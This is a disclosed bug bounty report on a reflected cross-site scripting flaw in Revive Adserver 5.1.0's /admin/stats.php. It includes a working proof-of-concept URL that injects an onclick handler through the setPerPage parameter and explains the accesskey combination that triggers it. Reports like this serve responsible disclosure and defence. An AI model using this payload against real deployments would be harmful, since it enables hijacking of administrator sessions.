# Reflected XSS on /admin/stats.php

## Report Details
- **Report ID**: 1083376
- **URL**: https://hackerone.com/reports/1083376
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2021-01-21T17:33:21.916Z
- **Disclosed**: 2021-01-26T14:27:08.895Z

## Reporter
- **Username**: solov9ev
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: revive_adserver

## Vulnerability Information
I found a reflected XSS attack on `/admin/stats.php`.

Revive-Adserver version is `revive-adserver-5.1.0`.

- Go to `http://revive-adserver.loc/admin/stats.php?statsBreakdown=day&listorder=key&orderdirection=up&day=&setPerPage=15%27%20onclick=alert(document.domain)%20accesskey=X%20&entity=global&breakdown=history&period_preset=last_month&period_start=01+December+2020&period_end=31+December+2020`

- For the payload to be executed, the user needs to press the access key combination for the hidden input field (for Firefox, `Alt`+`Shift`+`X`, see [this](https://developer.mozilla.org/en-US/docs/Web/HTML/Global_attributes/accesskey) for other browsers).

{F1166756}

## Impact

With this vulnerability, an attacker can for example steal users cookies or redirect users on malicious website.

## Attachments
- _________________2021-01-21_20-31-11.png
